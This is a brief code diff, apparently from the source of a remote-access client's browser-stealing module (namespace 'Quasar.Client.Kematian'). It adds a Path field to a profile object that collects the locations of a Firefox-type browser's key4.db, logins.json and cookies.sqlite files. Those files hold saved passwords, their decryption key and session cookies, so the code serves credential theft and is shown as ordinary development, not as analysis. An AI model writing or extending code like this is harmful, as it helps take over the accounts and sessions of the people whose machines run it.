@@ -117,6 +117,7 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
             var profile = new GeckoProfile
             {
                 Name = basePath.Split('\\').Last(),
+                Path = basePath,
                 Key4DB = Path.Combine(basePath, "key4.db"),
                 LoginsJson = Path.Combine(basePath, "logins.json"),
                 Cookies = Path.Combine(basePath, "cookies.sqlite"),
